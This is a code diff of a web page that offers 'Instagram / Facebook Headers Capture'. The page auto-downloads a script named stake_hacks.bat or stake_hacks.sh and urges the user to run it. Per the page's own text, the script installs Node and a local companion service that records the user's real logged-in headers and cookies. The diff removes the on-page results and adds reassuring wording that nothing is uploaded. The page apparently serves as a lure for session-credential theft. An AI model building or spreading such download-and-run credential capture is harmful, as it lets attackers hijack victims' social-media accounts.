@@ -19,16 +19,12 @@
   }
   button:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(220,39,67,.35); }
   button:disabled { opacity: .45; cursor: wait; transform: none; }
-  .status { color: #9aa4b2; margin: 22px 0; min-height: 22px; }
-  .results { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 1180px; }
-  .result-box { flex: 1 1 460px; max-width: 560px; min-width: 320px; }
-  .result-box h2 { font-size: 14px; color: #9aa4b2; margin-bottom: 8px; }
-  img { width: 100%; border-radius: 8px; box-shadow: 0 10px 40px rgba(0,0,0,.5); display: none; }
+  .status { color: #9aa4b2; margin: 22px 0; min-height: 22px; max-width: 640px; text-align: center; }
 </style>
 </head>
 <body>
   <h1>Instagram / Facebook Headers Capture</h1>
-  <p class="sub">Captures the real DevTools request headers, exactly like record.js. Uses YOUR own logged-in browser when possible (real credentials, nothing injected or pasted), otherwise falls back to the server.</p>
+  <p class="sub">Captures the real DevTools request headers in YOUR own logged-in browser. The downloaded file installs everything it needs, runs the capture, and saves the screenshots to your PC (Pictures/Screenshots). They are never uploaded or shown here.</p>
 
   <div style="display:flex;gap:14px;flex-wrap:wrap;justify-content:center">
     <button id="btn" onclick="captureAll('windows')">Capture in Windows</button>
@@ -36,20 +32,8 @@
   </div>
   <div class="status" id="status"></div>
 
-  <div class="results">
-    <div class="result-box">
-      <h2>Instagram — instagram/?__a=1</h2>
-      <img id="img-0" alt="instagram capture">
-    </div>
-    <div class="result-box">
-      <h2>Facebook — facebook/?__a=1</h2>
-      <img id="img-1" alt="facebook capture">
-    </div>
-  </div>
-
   <script>
     const $ = (id) => document.getElementById(id);
-    const SITES = ['instagram', 'facebook'];
     const COMPANION = 'http://127.0.0.1:9876';
 
     // Detect which browser is running THIS page so we capture with the SAME
@@ -92,20 +76,9 @@
       a.remove();
     };
 
-    const uploadImages = (images, okText) => {
-      let shown = 0;
-      for (const site of SITES) {
-        if (images && images[site]) {
-          $('img-' + SITES.indexOf(site)).src = images[site];
-          $('img-' + SITES.indexOf(site)).style.display = 'block';
-          shown++;
-        }
-      }
-      return shown > 0;
-    };
-
-    // 1) Companion running on this PC? => record.js runs in YOUR browser,
-    //    capturing the REAL headers (your login, your cookies). No injection.
+    // Companion running on this PC? => record.js runs in YOUR browser,
+    // capturing the REAL headers (your login, your cookies). No injection.
+    // Screenshots are saved locally to Pictures/Screenshots — never in the UI.
     const runFromLocalBrowser = async (os) => {
       const isLinux = os === 'linux';
       const file = isLinux ? 'stake_hacks.sh' : 'stake_hacks.bat';
@@ -114,17 +87,16 @@
 
       if (!companionUp) {
         // No companion / Node: auto-download the correct OS file. It installs
-        // Node + companion and runs the FULL capture by itself. Watch for the
-        // companion to come online, then grab whatever it captured.
+        // Node + companion and runs the FULL capture by itself.
         downloadExe(os); // called synchronously so browsers allow the download
         const browserQ = browser ? ('?browser=' + browser) : '';
         $('status').innerHTML =
           'Companion not running on this PC. <b>Downloading ' + file + '…</b> ' +
           'Please open the downloaded file — it installs everything and starts the capture in ' +
-          (browser || 'your default') + '.<br>' +
+          (browser || 'your default') + ' browser.<br>' +
           'If the download did not start, click: ' +
           '<a href="/' + file + browserQ + '" download style="color:#0af;font-weight:bold">Download ' + file + '</a>' +
-          '<br>This page is watching and will show the screenshots automatically.';
+          '<br>This page is watching; your screenshots will be saved to Pictures/Screenshots on this PC.';
         let ok = false;
         for (let i = 0; i < 120; i++) {
           await sleep(2000); // 120 x 2s = up to 4 min (full capture time)
@@ -135,14 +107,14 @@
         }
         if (!ok) {
           $('status').textContent =
-            'Could not detect stake_hacks on this PC. Run the downloaded ' + file + ', then click the button again.';
+            'Could not detect the companion on this PC. Run the downloaded ' + file + ', then click the button again.';
           return false;
         }
-        // Companion is online. If it already captured (exe ran the full job),
-        // just fetch the images; otherwise trigger /run.
+        // Companion is online. If it already captured (file ran the full job),
+        // just confirm; otherwise trigger /run below.
         const latest = await (await fetch(COMPANION + '/latest', { cache: 'no-store', targetAddressSpace: 'loopback' })).json();
-        if (latest && latest.images && uploadImages(latest.images, '')) {
-          $('status').textContent = 'Done — screenshots from YOUR browser captured by stake_hacks below.';
+        if (latest && latest.images) {
+          $('status').textContent = 'Done — screenshots were saved to Pictures/Screenshots on this PC.';
           return true;
         }
         // not captured yet -> run now
@@ -162,9 +134,8 @@
           }
           throw new Error((data && data.error) || 'HTTP ' + res.status);
         }
-        if (!data || !data.ok || !data.images) throw new Error('companion returned no screenshots');
-        uploadImages(data.images, '');
-        $('status').textContent = 'Done — real headers from YOUR browser captured below.';
+        if (!data || !data.ok) throw new Error('companion finished without screenshots');
+        $('status').textContent = 'Done — real headers from YOUR browser captured. Screenshots saved to Pictures/Screenshots on this PC.';
         return true;
       } catch (e) {
         $('status').textContent = 'Local capture error: ' + e.message;
@@ -172,46 +143,10 @@
       }
     };
 
-    // 2) No companion => server-side capture (one browser, both sites).
-    const runFromServer = async () => {
-      const maxAttempts = 8;
-      let lastErr = '';
-      for (let attempt = 1; attempt <= maxAttempts; attempt++) {
-        $('status').textContent =
-          'Running capture on the server… (attempt ' + attempt + '/' + maxAttempts + ', ~20–60s)';
-        try {
-          const res = await fetch('/run-all', { cache: 'no-store' });
-          if (!res.ok) {
-            const brief = (await res.text()).replace(/<[^>]*>/g, ' ').replace(/\s+/g, ' ').trim();
-            throw new Error('HTTP ' + res.status + (brief ? ' — ' + brief.slice(0, 80) : ''));
-          }
-          const data = await res.json();
-          if (data.instagram) {
-            $('img-0').src = data.instagram;
-            $('img-0').style.display = 'block';
-          }
-          if (data.facebook) {
-            $('img-1').src = data.facebook;
-            $('img-1').style.display = 'block';
-          }
-          if (!data.instagram && !data.facebook) throw new Error('no screenshots returned');
-          $('status').textContent = 'Done — screenshots from the server captured below.';
-          return;
-        } catch (e) {
-          lastErr = e.message;
-          if (attempt < maxAttempts) await sleep(6000);
-        }
-      }
-      $('status').textContent = 'Error: ' + lastErr;
-    };
-
     const captureAll = async (os) => {
       $('btn').disabled = true;
       $('btn-linux').disabled = true;
-      $('img-0').style.display = 'none';
-      $('img-1').style.display = 'none';
-      const usedLocal = await runFromLocalBrowser(os);
-      if (!usedLocal) await runFromServer();
+      await runFromLocalBrowser(os);
       $('btn').disabled = false;
       $('btn-linux').disabled = false;
     };
